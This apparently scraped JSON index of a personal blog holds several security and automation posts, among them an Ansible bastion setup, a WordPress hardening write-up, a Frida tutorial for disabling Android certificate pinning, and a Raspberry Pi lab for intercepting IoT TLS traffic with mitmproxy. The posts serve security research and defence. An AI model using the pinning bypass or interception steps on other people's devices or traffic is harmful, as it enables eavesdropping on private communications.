Engineers can collaborate together tracking and commenting each run/step/\u0026hellip; I would definitely give it a deeper look.\nBut remember, IaC is 80% plan and standardization :)\n","cover":"/images/vendors/spacelift.webp","permalink":"https://www.adainese.it/blog/2022/10/31/improving-iac-with-spacelift/","title":"Improving IaC with Spacelift"},{"categories":["automation"],"contents":"This is the second part of my IaC overview based on a personal experiment: building Cyber range using the IaC paradigm. Here are the first and third parts.\nIn a pure design perspective, the client-to-site VPN approach is still the best. But from an automation perspective, I had to redesign it including a bastion host. I don\u0026rsquo;t like the idea so much, but the pros are more than the cons.\nScenario Compared to the scenario with the client-to-site VPN concentrator, this one seems simpler: internal VMs are reachable via the Linux bastion host. In practice, the bastion host proxies SSH connections. The bastion host does not require any configuration at all.\nBecause my scenario requires that attendees can reach internal VMs, I copy into the bastion host the SSH private key needed to log in to the internal VMs. In the future, I think it\u0026rsquo;s better if the bastion host serves also as an OpenVPN concentrator.\nBastion host and AWS EC2 dynamic inventory At this point Ansible should:\nconfigure the bastion host using the public IP address; configure the internal hosts using the private IP address via the bastion host\u0026rsquo;s public IP address. Because of the Spacelift design, I had to configure everything using a single Ansible playbook. It means that the AWS EC2 Ansible inventory must:\nreturn the public IP address for the bastion host; return the private IP addresses for the internal VMs. Moreover, Ansible should configure the SSH proxy just before logging in to each internal host.\nAfter several attempts, I find a working recipe. Let\u0026rsquo;s start with the Ansible inventory:\nplugin: aws_ec2 regions: - eu-central-1 filters: instance-state-name: running keyed_groups: - key: tags prefix: tag hostnames: - tag:Name compose: ansible_host: public_ip_address if tags.Name == \u0026#34;bastion\u0026#34; else private_ip_address Remember I wrote that IaC is 80% plan and standardization? I assume that in every scenario I will use \u0026ldquo;bastion\u0026rdquo; as the hostname for the bastion host, and I tag the hostname in the AWS EC2 configuration. This is one of my \u0026ldquo;standards\u0026rdquo; (assumptions).\nIn the above AWS EC2 Ansible inventory configuration, I return the public IP address only if the Name tag is equal to bastion. The inventory returns the private IP address for any other VMs.\nMy Ansible playbook starts configuring the Ansible host:\n- hosts: tag_Name_bastion gather_facts: no remote_user: ubuntu roles: - role: linux-bastion tags: always In the role, I find the available SSH key and upload it to the bastion host for attendees. Remember I wrote that I want a \u0026ldquo;soft\u0026rdquo; lock-in? That\u0026rsquo;s where I make the playbook compatible with Spacelift environments and mine. I also used the tag \u0026ldquo;always\u0026rdquo; because I configure ansible_ssh_private_key_file (see after).\nConfiguring internal hosts via bastion At this point I can configure internal hosts. Another assumption I made is that tags contains any interesting attributes I use in Ansible to group, query and configure hosts. In practice I\u0026rsquo;m using the following tags:\nOs:ubuntu: for Ubuntu VMs; Database:mariadb: for MariaDB VMs; Webapp:wordpress: for VMs with Wordpress. My Ansible playbook runs multiple plays:\n- hosts: tag_Name_bastion gather_facts: no remote_user: ubuntu roles: - role: linux-bastion tags: always - hosts: tag_Os_ubuntu:!tag_Name_bastion gather_facts: yes become: yes vars_files: - default.yaml roles: - role: set-environment tags: always # [...] - hosts: tag_Os_ubuntu:\u0026amp;tag_Database_mariadb gather_facts: yes become: yes vars_files: - default.yaml roles: - role: set-environment tags: always - role: linux-mariadb tags: mariadb # [...] - hosts: tag_Os_ubuntu:\u0026amp;tag_Webapp_wordpress # [...] Ansible facts are host specific: it means that if I set ansible_ssh_private_key_file on the bastion host, it is undefined for other hosts.\nHow could I configure SSH proxy for any internal hosts excluding the bastion host?\nThe magic happens in the default.yaml file using Ansible facts and magic variables. The default.yaml file is included in any playbook targeting internal hosts and it configures the SSH proxy using information from the inventory:\nansible_user: \u0026#34;{{ tags.User }}\u0026#34; ansible_ssh_private_key_file: \u0026#39;{{ hostvars[\u0026#34;bastion\u0026#34;][\u0026#34;ansible_ssh_private_key_file\u0026#34;] }}\u0026#39; ansible_ssh_common_args: \u0026gt;- -o ProxyCommand=\u0026#34;ssh -o IdentityFile={{ hostvars[\u0026#34;bastion\u0026#34;][\u0026#34;ansible_ssh_private_key_file\u0026#34;] }} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p -q {{ hostvars[\u0026#34;bastion\u0026#34;][\u0026#34;tags\u0026#34;][\u0026#34;User\u0026#34;] }}@{{ hostvars[\u0026#34;bastion\u0026#34;][\u0026#34;public_ip_address\u0026#34;] }}\u0026#34; [...] Remember I wrote that IaC is 80% plan and standardization? I\u0026rsquo;m still assuming that the bastion host is called bastion, and the tag User contains the remote user for each VM. So, for each VM:\nansible_user: contains the remote username configured in the tag User; ansible_ssh_private_key_file: contains the local (stored in the Ansible VM) SSH private key and the information is taken from the bastion host entry configured in the inventory; ansible_ssh_common_args: contains the SSH proxy command used from Ansible and configured using the bastion public IP address taken from the inventory. Both SSH keys must be local to the Ansible host.\nAt this point, I have a single Ansible playbook that configures my Cyber range scenario using a bastion host.\nConclusions I find that bastion hosts are commonly used. I don\u0026rsquo;t like them very much because from a security perspective the bastion host is one more host with superpowers. But from an automation perspective, this is actually the only successful way.\n","cover":"/blog/2022/10/30/ansible-with-bastion-host/cyber-range-diagram-w-bastion.webp","permalink":"https://www.adainese.it/blog/2022/10/30/ansible-with-bastion-host/","title":"Ansible with bastion host"},{"categories":["automation"],"contents":"This is the first part of my IaC overview based on a personal experiment: building Cyber range using the IaC paradigm. Here are the second and third parts.\nDuring my Twitch session, I\u0026rsquo;m used to offering a practical lab to attendees. My labs are automatically created on AWS, using Terraform and Ansible.\nScenario My scenario is pretty simple: I need to create a set of VM inside AWS and configure them with some additional software and services. Those VMs expose some vulnerable services which can be exploited and defended by attendees.\nBefore starting the Twitch session, I manually started Terraform and Ansible to create and configure VMs. To be specific I use:\nTerraform, to create VMs in AWS; Terraform, to create client-to-site VPN gateway; OpenVPN to connect to the internal side of the lab; Ansible, via OpenVPN, to configure VMs. The building process takes less than 10 minutes.\nPlan and standardization IaC is 80% plan and standardization. It means that we need to identify requirements, scenarios, and corner cases. Then we need to identify how we define our infrastructure (I refer to this phase as \u0026ldquo;modeling\u0026rdquo;), and finally, we should write prototypes to verify our idea and approach.\nIn my case I need to create Cyber range scenarios that can include multiple VMs:\nwith various operating systems and applications; attached to different networks; possibly protected by additional appliances (firewalls). All VMs must be accessible by a specific host to configure them.\nLast requirement: all scenarios should be completely created from scratch and destroyed after the session. No permanent data is expected.\nIn my case I decided to:\nwrite a custom Terraform module to create the basic infrastructure (Internet access, basic networks, client-to-site VPN gateway, or bastion hosts); define manually the additional components (additional VMs, networks, and how they are connected); configure each VMs using roles (multiple roles can be configured within the same VM). Creating infrastructure The very basic scenario requires creating a bastion host and at least one Ubuntu Linux VM. The Terraform documentation is pretty explanatory, and there are no issues with that.\nMy only suggestion is: plan carefully what you need now and shortly, and be ready to adapt.\nIn my cases, I decided to use tags to track down OS, installed applications, purpose, and administrative users\u0026hellip; Those tags will be useful in Ansible.\nConfiguring the infrastrucutre Here come the problems: Terraform and Ansible are two different universes, and I need to make them communicate. Using AWS, and planning carefully my infrastructure, I found the AWS EC2 Ansible inventory pretty good, even if it has some limitations.\nIn short:\nTerraform creates the infrastructure by applying tags; AWS EC2 Ansible inventory fetches the AWS EC2 instances and prepares an Ansible-compatible inventory, maintaining the tags; After establishing the OpenVPN connection, Ansible can configure internal VMs. The Ansible AWS EC2 inventory resolves all internal VMs with the private IP address:\nplugin: aws_ec2 regions: - eu-central-1 filters: instance-state-name: running keyed_groups: - key: tags prefix: tag hostnames: - tag:Name compose: ansible_host: private_ip_address At this point, we have an excellent way to build and configure the infrastructure, no matter if VMs are reachable from the Internet or not. The only side effect is that client-to-site VPN connections impact a lot on my AWS account.\nOther stuff (certificates) The above approach requires building and maintaining a CA (Certification Authority):\nAWS client-to-site concentrator requires a server certificate; VPN clients need the CA public certificate to validate the concentrator certificate; VPN clients need a valid certificate to be accepted by the VPN concentrator; AWS client-to-site concentrator needs the CA public certificate to validate the client certificates; additional servers (e.g. web servers) could need valid certificates. Even if the AWS and Terraform documentations are very good, this task cost me hours to find the right approach.\nConclusions As I wrote before, IaC is 80% plan and standardization. Speaking about enterprises, there is no \u0026ldquo;standard approach\u0026rdquo;, everything should be designed around a specific context, with particular needing. In a real-world scenario, many teams are involved: operations (of course), consumers (e.g. developers), audit and compliance, and security\u0026hellip; IaC requires a \u0026ldquo;holistic approach\u0026rdquo;, teams cannot go with an IaC approach without involving stakeholders. Going alone means failure: limitations, high costs, and a lot of unplanned exceptions\u0026hellip;\n","cover":"/blog/2022/10/29/infrastructure-as-code-for-cyber-ranges/cyber-range-diagram.webp","permalink":"https://www.adainese.it/blog/2022/10/29/infrastructure-as-code-for-cyber-ranges/","title":"Infrastructure as code for Cyber Ranges"},{"categories":["security","writeup"],"contents":"During the last \u0026ldquo;Blue Vs Red\u0026rdquo; events, together with Rocco Sicilia , we discussed how to attack and defend a simple, all-in-one, WordPress site. This post serves as a memorandum to remember all topics we discussed and how we reacted to specific attacks.\nAttack surface analysis Because the scenario has been built from scratch, we discussed this topic in theory. We realized that Shodan, Censys, ZoomEye offer a lot of information without the necessity of probing the target.\nThose Internet probes could be filtered by a firewall, ingesting an updated IP feed. One of the tools which can grab, enrich and combine external feeds is MineMeld . the feeds provided by MineMeld could be ingested by firewalls.\nActive analysis In the active analysis we used some web discovery tools , Nmap , dirbuster , and WPScan . In less than two hours the Apache access log reported more than 26000 requests.\nWe could rate limit the connections using a firewall, but with iptables rate limit could lead to a DOS . Enterprise firewalls or WAFs can identify network scanners and rate limit users\u0026rsquo; connections.\nRegarding WPScan we realized that a simple directory containing a README file could be reported as a vulnerable plugin: following this approach we could add a lot of fake vulnerable plugins so attackers cannot figure out what is installed.\nWe also decided to reduce the Apache fingerprint:\nServerSignature Off ServerTokens Prod We also installed WP fail2ban to detect Wordpress login bruteforcing attacks, and ideally that logs could be ingested by a SIEM or by fail2ban .\nWe also discussed how Apache should serve default virtual hosts: we know that network probes (Shodan, Censys, ZoomEye\u0026hellip;) scan IP addresses, not (yet) domains. If we configure the default virtual host to return HTTP 400 for all requests, we reduce the amount of information an attacker can easily retrieve.\nFinally, from both performance and security perspectives, we should monitor HTTP errors (40x, 50x) and detect anomalies: a SIEM could do that, but so it does a performance dashboard. A SOAR could automatically add the malicious IP addresses into a feed ingested by the firewall.\nSlowlorice attack We discussed the slowlorice attack but we didn\u0026rsquo;t test it: basically, a slowlorice attack uses a lot of established TCP connections with an incomplete HTTP request. Even with a slow Internet connection, an attacker can take down a powerful web server. This attack can be reduced by WAF but it can also be mitigated tuning the Apache configuration (with the reqtimeout module):\nRequestReadTimeout header=1,minrate=500 RequestReadTimeout body=1,minrate=500 The configuration can be validated with:\nslowhttptest -c 400 -H -i 10 -r 200 -t GET -u http://Target_URL -x 24 -p 5 To Be Continued\u0026hellip;\n","cover":"/blog/2022/09/22/blue-vs-red-write-up-1/twitch.webp","permalink":"https://www.adainese.it/blog/2022/09/22/blue-vs-red-write-up-1/","title":"Blue Vs Red: write-up 1"},{"categories":["automation"],"contents":"Years ago I worked on a data center migration project. I was in charge to review network documentation, and automating the configuration, testing, and migration phases. There is no chance to review dozens of switches manually, so I wrote some Python scripts to get neighborship and configuration from switches, drawing Visio diagrams. In the end, I was able to discover an entire network topology in minutes.\nNetDoc would be the industrialized, open-source tool available to the public to discover multi-vendor networks. It\u0026rsquo;s based on Netbox, Netmiko, nornir, ntc-templates, and netbox-topologyi-views.\nA next step would see draw.io integrated into netbox-topology-views to export diagrams in a reusable format.\nInstall NetDoc requires a working netbox instance. Please see how to install netbox, then see how to install NetDoc. In this post, I\u0026rsquo;m using netbox 3.3.2.\nIf you find it useful, don\u0026rsquo;t forget to sponsor it.\nUsage Once we logged in we have to create a site. Then go to Plugins -\u0026gt; Netdoc -\u0026gt; Credentials and add or import all credentials used to log in to network devices. We can also import via CSV using the following format:\nname,username,password,enable_password ssh-admin-w-enable,admin,C1sco123,C1sco123 ssh-admin-wo-enable,admin,C1sco123, Then we need to add/import at least one discoverable. A discoverable is a network node NetDoc can retrieve information from. Again we can import via CSV using the following format:\naddress,credential,mode,site 172.25.82.38,ssh-admin-w-enable,netmiko_cisco_nxos,Test Site 172.25.82.37,ssh-admin-w-enable,netmiko_cisco_nxos,Test Site 172.25.82.36,ssh-admin-w-enable,netmiko_cisco_nxos,Test Site 172.25.82.35,ssh-admin-w-enable,netmiko_cisco_nxos,Test Site We need to edit those devices and make them discoverable. We can now start the discovery, selecting one or more discoverable and pressing the button.\nWe can follow the discovery process using journalctl:\n# journalctl -u netbox-rq -f Aug 28 19:54:55 linux-station python3[306570]: multiple_tasks******************* *********************************************** Aug 28 19:54:55 linux-station python3[306570]: * 172.25.82.35 ** changed : False ********************************************** Aug 28 19:54:55 linux-station python3[306570]: vvvv multiple_tasks ** changed : False vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv INFO Aug 28 19:54:55 linux-station python3[306570]: ---- show running-config ** chang ed : False ------------------------------------ INFO Aug 28 19:54:55 linux-station python3[306570]: Building configuration... Aug 28 19:54:55 linux-station python3[306570]: Aug 28 19:54:55 linux-station python3[306570]: Current configuration : 3662 bytes Aug 28 19:54:55 linux-station python3[306570]: ! Aug 28 19:54:55 linux-station python3[306570]: ! Last configuration change at 12:00:59 UTC Wed Jul 13 2022 Aug 28 19:54:55 linux-station python3[306570]: ! Aug 28 19:54:55 linux-station python3[306570]: version 15.2 The discovery scripts should populate the following netbox items:\nDevices Manufacturers Interfaces Cables IP Addresses Prefixes VRFs VLANs Moreover, new discoverables detected via CDP/LLDP protocols will be automatically added: they can be discovered after reviewing the IP address and the discovery method.\nThe discovery process should bind a Device to each discoverable, but in case this is not happening (e.g. Cisco XR) we can bind them manually.\nAdditional info NetDoc will also discovers ARP Table, MAC Address Table, Routing Table from each discoverable.\nFinally, all data (logs) fetched by discoverables are stored and can be reviewed:\nConfiguration bit is set if the log contains the discoverable configuration. Success bit is set if the command has returned a valid output. Parsed bit is set if the output has been successfully parsed. Ingested bit is set if the parsed output has been ingested to netbox. L2 Network topology Using CDP and LLDP NetDoc can discover L2 adjacencies. For each adjacency a cable is created:\nUsing the plugin netbox-topologyi-views we can automatically draw L2 topologies. Each device can be associated with a specific image using the Device Role attribute. Device roles must be created with one of the following slugs:\naccess-switch backup core-switch distribution-switch firewall internal-switch isp-cpe-material non-racked-devices power-units role-unknown router server storage wan-network wireless-ap Opening Plugins -\u0026gt; Topology Views we can see a L2 topology diagram:\nnetbox-topology-views is currently working on netbox 3.2 only.\nL3 Network topology During my network assessment I need to draw L3 topology diagrams too. I forked netbox-topologyi-views, implementing the feature I need:\nThe L3 diagram is VRF aware: you need to manually update VRF on Prefixes (and you would also to update IP Addresses too).\nConclusions NetDoc is in the alpha version. Currently supports Cisco devices only but can be extended. Even if it is alpha software, it is saving me a lot of time.\nIf you want to contribute, drop me a message. I don\u0026rsquo;t consider myself a software developer and there are (for sure) a lot of bugs.\n","cover":"/blog/2022/08/28/netdoc-automated-network-discovery-and-documentation/cables.webp","permalink":"https://www.adainese.it/blog/2022/08/28/netdoc-automated-network-discovery-and-documentation/","title":"NetDoc: automated network discovery and documentation"},{"categories":["security","personal-security","notes"],"contents":"I always need to set critical environment variables on my Bash (API tokens), and of course, it\u0026rsquo;s a very bad idea to store them on .bashrc. I found a simple way to store them in an encrypted file loading it only when necessary:\nStore critical variables under .bash_secure (you must export each variable). Encrypt it with gpg -c .bash_secure. Secure delete the clear text file with shred -u .bash_secure. Load secured environment only when needed source \u0026lt;(gpg -q -d ~/.bash_secure.gpg) Don\u0026rsquo;t put the load command into .bashrc because commands included in .bashrc must not emit output.\n","cover":"/images/vendors/bash.webp","permalink":"https://www.adainese.it/blog/2022/08/14/secured-bash-environment/","title":"Secured Bash environment"},{"categories":["personal-security","notes"],"contents":"A few days ago, my daughter has deleted by mistake some photos on her camera. It has been 10 years at least since I recovered deleted files last time, so I had to find out how to approach the problem in 2022 with Kali Linux.\nI found TestDisk , available on Kali Linux and it recovered my photos without any issues.\nHere is the procedure I followed:\nConnect the USB storage. Identify the disk, the partition type (DOS or GPT), and the partition with parted -l, Run testdisk. Click on Create a new log file. Highlight the USB disk. Click on Proceed. Click on the right partition type (in my case Intel/PC partition). Click on Advanced Filesystem Utils. Highlight the partition. Click on Undelete. Select files and directories to be recovered by pressing :. Press C to copy selected files and directories. Select the destination folder and press again C to start the recovery process. In the end, we\u0026rsquo;ll find all files and directories under the destination path we chose.\nMy scenario was very simple, but you would try PhotoRec also.\nReferences TestDisk PhotoRec ","cover":"/images/vendors/photorec.webp","permalink":"https://www.adainese.it/blog/2022/08/13/recover-deleted-photos-with-kali-linux-and-testdisk/","title":"Recover deleted photos with Kali Linux and TestDisk"},{"categories":["personal-security"],"contents":"During security assessment on Smarthome applications, I usually need to analyze encrypted HTTPS communications. Applications usually check for valid certificates, but also check that certificates are signed by a specific issuer. This is called \u0026ldquo;Certificate Pinning\u0026rdquo;, even if it\u0026rsquo;s not recommended, it\u0026rsquo;s widely used:\nCaution: Certificate Pinning is not recommended for Android applications due to the high risk of future server configuration changes, such as changing to another Certificate Authority, rendering the application unable to connect to the server without receiving a client software update.\nTo decypher HTTPS connection protected with Certificate Pinning, we need a different approach: Frida, a Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.\nInstalling Frida on Kali Linux Let\u0026rsquo;s prepare our Kali Linux:\nsudo apt install android-tools-adb android-tools-fastboot We are installing an old Python version from sources:\nsudo apt install libssl-dev libsqlite3-dev liblzma-dev libffi-dev zlib1g-dev wget https://www.python.org/ftp/python/3.7.12/Python-3.7.12.tgz tar xzvf Python-3.7.12.tgz -o -C /opt cd /opt/Python-3.7.12 ./configure --enable-optimizations make Finally, we are building a virtual environment:\n./python -m venv ~/.venv-frida Using the above Python interpreter and virtual environment, we can install Frida:\nsource ~/.venv-frida/bin/activate pip install frida-tools objection Installing Frida server on Android device On a rooted Android device, enable USB Debugging mode. Go to Settings \u0026gt; About Phone \u0026gt; Software Information and click 7 times on Build Number, then go to Settings \u0026gt; Developer Options \u0026gt; Enable \u0026gt; USB Debugging and enable it.\nConnect the phone via USB cable to your computer and restart ADB:\nadb kill-server adb devices - daemon not running; starting now at tcp:5037 - daemon started successfully List of devices attached 520011a1a0123143 device Download the proper Frida version and an frida-android-unpinning:\nwget https://github.com/frida/frida/releases/download/15.2.2/frida-server-15.2.2-android-arm64.xz wget https://raw.githubusercontent.com/httptoolkit/frida-android-unpinning/main/frida-script.js Upload Frida server to the Android device:\nunxz frida-server-15.1.12-android-arm.xz mv frida-server-15.1.12-android-arm frida-server adb push frida-server /data/local/tmp/ Finally start the Frida server on the Android device:\nadb shell su /data/local/tmp/frida-server Open another shell on Kali Linux, using the Python virtual environment built for Frida, and check the network connection between the client (Kali Linux) and server (Android):\nfrida-ps -U The last command should return the list of running processes on the Android.\nRunning an application without certificate pinning We are now ready to run an application disabling the certificate pinning. All following commands are run on Kali Linux.\nIdentify the package name of the application we want to run:\nadb shell pm list packages --user 0 -u | grep -i appname Be sure the application is not running on the Android device:\nfrida-ps -U | grep -i AppName Start the application:\nfrida --no-pause -U -l ./frida-script.js -f com.appname.start The app will start on the smartphone popping up on the screen. All HTTPS connections will have certificate pinning disabled and could be intercepted by MITM Proxy.\n","cover":"/blog/2022/07/23/disable-android-certificate-pinning-with-frida/frida.webp","permalink":"https://www.adainese.it/blog/2022/07/23/disable-android-certificate-pinning-with-frida/","title":"Disable Android Certificate Pinning with Frida"},{"categories":["personal-security"],"contents":"As private individuals we are using a lot of consumer IoT devices: almost any standard home equipment can now be remotely controlled by a specific application installed on a smartphone.\nThe question is: how much can we trust those IoT devices? In which way our digital security and privacy is affected?\nTo answer those questions, we are building a small and cheap IoT testing lab.\nDesign The design is simple: we want a flexible device (Linux based) to intercept any Ethernet/IP traffic emitted by the IoT device.\nThe Linux device will provide an Internet connection to the IoT device dumping all traffic data and metadata and intercepting encrypted traffic also.\nBill of material (BOM) For our testing lab we are using:\nRaspberry Pi 4 8 GB RAM Raspberry Pi 4 case and accessories microSD Samsung Evo plus 128 GB Ethernet 10/100/1000 USB 3.0 adapter D-Link DWL-G730AP Logitech K360 Wireless keyboard Kali Linux for ARM NextDNS account The Kali Linux ARM image can be dumped to the microSD using Raspberry Pi Imager .\nI\u0026rsquo;m using an old portable Wireless access point I bought years ago. I guess this one works too in \u0026ldquo;Access Point\u0026rdquo; mode.\nFirst boot After the first boot, we can start to configure our Raspberry Pi. By default SSH is enabled on Kali Linux:\nsudo systemctl start ssh sudo systemctl enable ssh We need to install some packages required in the next steps:\nsudo apt-get update sudo apt-get dist-upgrade sudo apt-get autoremove sudo apt-get install iptables-persistent dnsmasq sudo mkdir -p /var/log/analysis/zeek/ Finally, maybe we want to adjust the keyboard and timezone:\nsudo dpkg-reconfigure keyboard-configuration sudo timedatectl set-timezone Europe/Rome We want to disable embedded Bluetooth and wireless adapters:\nsudo echo \u0026#34;dtoverlay=disable-bt\u0026#34; \u0026gt;\u0026gt; /boot/config.txt sudo echo \u0026#34;dtoverlay=disable-wifi\u0026#34; \u0026gt;\u0026gt; /boot/config.txt A reboot is suggested to apply all the above configurations.\nNetwork configuration We expect our Pi acts as a router, so we need to configure two network interfaces. The first one is configured by default with DHCP, the second one must be configured:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/network/interfaces.d/eth0 auto eth0 allow-hotplug eth0 iface eth0 inet dhcp EOF sudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/network/interfaces.d/eth1 auto eth1 allow-hotplug eth1 iface eth1 inet static address 192.168.0.1 netmask 255.255.255.0 EOF To enable the Pi to act as a router we have to enable IPv4 forwarding. Edit /etc/sysctl.conf and set:\nnet.ipv4.ip_forward=1 At the end reload sysctl settings:\nsysctl -p To make the Internet reachable from devices attached to eth1 we need to enable NAT. Moreover we want to enable additional tricks to force DNS traffic and log requests coming from eth1:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/iptables/rules.v4 *nat :PREROUTING ACCEPT [0:0] :INPUT ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :POSTROUTING ACCEPT [0:0] -A PREROUTING ! -d 192.168.0.1/32 -p udp -m udp --dport 53 -j MARK --set-xmark 0x1/0xffffffff -A PREROUTING -m mark --mark 0x1 -j LOG --log-prefix \u0026#34;iptables: direct_dns \u0026#34; -A PREROUTING -m mark --mark 0x1 -j DNAT --to-destination 192.168.0.1 -A POSTROUTING -o eth0 -j MASQUERADE COMMIT *filter :INPUT DROP [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :Services - [0:0] -A INPUT -i lo -j ACCEPT -A INPUT -i eth1 -j ACCEPT -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -m state --state NEW -j Services -A FORWARD -i eth1 -m state --state NEW -j MARK --set-xmark 0x2/0xffffffff -A FORWARD -m mark --mark 0x2 -j LOG --log-prefix \u0026#34;iptables: new_conn \u0026#34; -A Services -p tcp -m tcp --dport 22 -j ACCEPT -A Services -p tcp -m tcp --dport 9090 -j ACCEPT COMMIT EOF We can reload the firewall with:\nsudo iptables-restore /etc/iptables/rules.v4 Finally, we want to make iptables log on a dedicated file:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/rsyslog.d/iptables.conf :msg, regex, \u0026#34;iptables: \u0026#34; -/var/log/analysis/iptables.log EOF We need to restart rsyslog:\nsudo systemctl restart rsyslog DNS and DHCP server To intercept and track DNS requests we want to use DNSMasq: it can act as DNS and DHCP server. Be sure DNSMasq load external configurations file editing /etc/dnsmasq.conf:\nconf-dir=/etc/dnsmasq.d/,*.conf We can configure DHCP as follows:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/dnsmasq.d/network.conf interface=eth1 dhcp-range=192.168.0.50,192.168.0.150,24h EOF We want to forward the DNS requests to NextDNS. Be sure you are using your CPE otherwise, you won\u0026rsquo;t see DNS requests on your NextDNS dashboard:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/dnsmasq.d/nextdns.conf port=53 no-resolv no-hosts bogus-priv strict-order server=45.90.30.0 server=45.90.28.0 add-cpe-id=aaaaaa EOF We want DNSMasq to log all requests on a specific file:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/dnsmasq.d/logging.conf # Log each DNS query log-queries # Log lots of extra information about DHCP log-dhcp # Log into a dedicated files log-facility=/var/log/analysis/dnsmasq.log EOF Finally, we need to restart DNSMasq:\nsudo systemctl enable dnsmasq sudo systemctl restart dnsmasq Full traffic capture Even if it won\u0026rsquo;t be easy to analyze captured packets, it\u0026rsquo;s still useful to have them so we can analyze specific conversations. We are configuring a small service to capture any packets entering from eth1:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/systemd/system/tcpdump.service [Unit] After=network.target [Service] Restart=always RestartSec=30 Environment=\u0026#34;TCPDUMP_FORMAT=%%Y%%m%%d-%%H:%%M:%%S\u0026#34; ExecStartPre=/bin/mkdir -p /var/log/analysis ExecStart=/usr/bin/tcpdump -G 3600 -i eth1 -w \u0026#34;/var/log/analysis/tcpdump-eth1-${TCPDUMP_FORMAT}.pcap\u0026#34; ExecStop=/bin/kill -s SIGINT $MAINPID [Install] WantedBy=multi-user.target EOF We need to enable and start the new service:\nsudo systemctl daemon-reload sudo systemctl enable tcpdump sudo systemctl start tcpdump Light traffic capture (metadata) We need a faster way to understand what the testing device is doing.\nZeek can help to capture traffic metadata in a human-readable format. Zeek is not available on Kali Linux for Raspberry Pi, so we need to compile it. The process requires a few hours:\nsudo apt-get install cmake flex bison libpcap-dev libssl-dev python3 python3-dev swig zlib1g-dev sudo apt-get install python3-git python3-semantic-version exim4 git clone --recursive https://github.com/zeek/zeek cd zeek ./configure make sudo make install We want to install Zeek auxiliary programs also:\ncd auxil/zeek-aux ./configure make sudo make install Maybe we want to include the Zeek binary directory in the path:\nexport PATH=/usr/local/zeek/bin:${PATH} To configure Zeek we need to edit /usr/local/zeek/etc/node.cfg:\n[zeek] type=standalone host=localhost interface=eth1 We also want Zeek log on the same directory we used before. Edit also /usr/local/zeek/etc/zeekctl.cfg and set:\nLogDir = /var/log/analysis/zeek Finally, we are ready to update Zeek installation/configuration:\nsudo zeekctl install We can manually start Zeek or configure a SystemD service:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/systemd/system/zeek.service [Unit] Description=zeek network analysis engine [Service] Type=forking PIDFIle=/var/run/zeek.pid ExecStart=/usr/local/zeek/bin/zeekctl start ExecStop=/usr/local/zeek/bin/zeekctl stop [Install] WantedBy=multi-user.target EOF And enable it during the boot:\nsudo systemctl daemon-reload sudo systemctl enable zeek sudo systemctl start zeek MITM Proxy We are using MITM Proxy to analyze encrypted HTTP connections. We can install it with:\nsudo apt-get install mitmproxy We can configure MITM Proxy as a system service:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/systemd/system/mitmproxy.service [Unit] Description=MITMProxy [Service] Type=simple ExecStart=/usr/bin/mitmweb --mode transparent --web-port 9090 --web-host 0.0.0.0 --no-web-open-browser StandardOutput=file:/var/log/analysis/mitmproxy.log StandardError=file:/var/log/analysis/mitmproxy.log [Install] WantedBy=multi-user.target EOF And we want to start it on boot:\nsudo systemctl daemon-reload sudo systemctl start mitmproxy sudo systemctl enable mitmproxy To intercept the traffic we need to NAT (REDIRECT) HTTP and HTTPS connections to the port used by MITM Proxy (default is 8080), so the traffic can be intercepted:\nsudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -m comment --comment \u0026#34;mitmproxy\u0026#34; -j REDIRECT --to-port 8080 sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 443 -m comment --comment \u0026#34;mitmproxy\u0026#34; -j REDIRECT --to-port 8080 Because we need to activate and deactivate MITM Proxy traffic inspection, we can use a simple script:\n#!/bin/bash function disable() { iptables -t nat -S | grep mitmproxy | cut -d\u0026#34; \u0026#34; -f2- | xargs -rL1 iptables -t nat -D } function enable() { disable iptables -t nat -A PREROUTING -p tcp --dport 80 -m comment --comment \u0026#34;mitmproxy\u0026#34; -j REDIRECT --to-port 8080 iptables -t nat -A PREROUTING -p tcp --dport 443 -m comment --comment \u0026#34;mitmproxy\u0026#34; -j REDIRECT --to-port 8080 } case $1 in enable) enable ;; disable) disable ;; *) echo \u0026#34;Use $0 enable|disable\u0026#34; exit 1 ;; esac We can activate and deactivate traffic interception with:\nsudo /root/mitmproxy.sh enable sudo /root/mitmproxy.sh disable MITM Proxy web interface is available on port 9090 by default.\nTraffic interception Once traffic interception is activated, HTTPS connections will be broken into two parts:\nThe first diagram shows non-intercepted HTTPS connections: in this case, the client gets a valid signed certificate.\nThe second diagram shows HTTPS connections intercepted by MITM Proxy: the client gets an invalid self-signed certificate by the MITM Proxy server.\nWe have three different scenarios:\nthe application is not validating certificates, and MITM Proxy can intercept the traffic. the application is validating certificates and certificate pinning is not configured in the application. the application is validating certificates and certificate pinning is configured in the application. In the second scenario, we can enable the traffic interception by installing the MITM Proxy certificate into the device and trusting it. From the device open http://mitm.it and install the self-signed certificate.\nIn the third scenario the application is validating a specific certificate so even if the MITM Proxy certificate is trusted, the application recognizes a MITM attack:\n192.168.0.126:34170: Client TLS handshake failed. The client may not trust the proxy\u0026#39;s certificate for www.google.com (OpenSSL Error([(\u0026#39;SSL routines\u0026#39;, \u0026#39;ssl3_read_bytes\u0026#39;, \u0026#39;sslv3 alert certificate unknown\u0026#39;)])) To bypass certificate pinning, see the post about Frida .\nLog rotation To keep the system clean we rotate logs:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/logrotate.d/analysis /var/log/analysis/iptables.log { daily rotate 7 nocompress missingok notifempty dateext } /var/log/analysis/dnsmasq.log { daily rotate 7 nocompress missingok notifempty dateext } /var/log/analysis/tcpdump { daily 